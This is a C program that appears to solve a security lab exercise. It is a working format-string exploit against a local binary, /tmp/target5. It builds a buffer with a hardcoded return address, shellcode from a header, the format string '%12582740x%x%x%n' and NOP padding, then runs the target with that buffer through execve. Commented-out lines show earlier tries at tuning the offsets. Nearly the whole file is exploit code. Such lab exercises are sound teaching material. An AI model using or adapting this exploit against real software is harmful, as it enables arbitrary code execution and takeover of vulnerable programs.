
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
//	char arg1[] = "Hi there!";
	char weapon[200];
	int i;
	char *string;
	for(i=0;i<200;i++)
	weapon[i] = 'a';
//	a = strlen(shellcode);
//	printf("shellcode length : %d ",a);
	weapon[0] = 0x7d;
	weapon[1] = 0xfd;
	weapon[2] = 0xff;
	weapon[3] = 0xbf;
//	weapon[4] = 0x7d;
//	weapon[5] = 0xfd;
//	weapon[6] = 0xff;
//	weapon[7] = 0xbf;
//	for (i=8;i<121;i++)
//	weapon[i] = '\x90';
	for(i=0;i<strlen(shellcode);i++)
	weapon[i+40] = shellcode[i];
//	string = "%08x%08x%190x%n%12582908x%n";
//	string = "%08x%08x%08x%12582908x%n";
//	string = "%x%x%12582739x%n";
	string = "%12582740x%x%x%n";
//	a=strlen(string);
//	printf("string length : %d ", a);
	memcpy(weapon + 120 + strlen(shellcode), string, strlen(string));
	for(i=120+strlen(shellcode)+strlen(string);i<199;i++)
	weapon[i]= 0x90;
	weapon[199]=0x00;
	char *args[] = { TARGET, weapon, NULL };
	char *env[] = { NULL };
	if (0 > execve(TARGET, args, env))
			fprintf(stderr, "execve failed.\n");

	return 0;
}
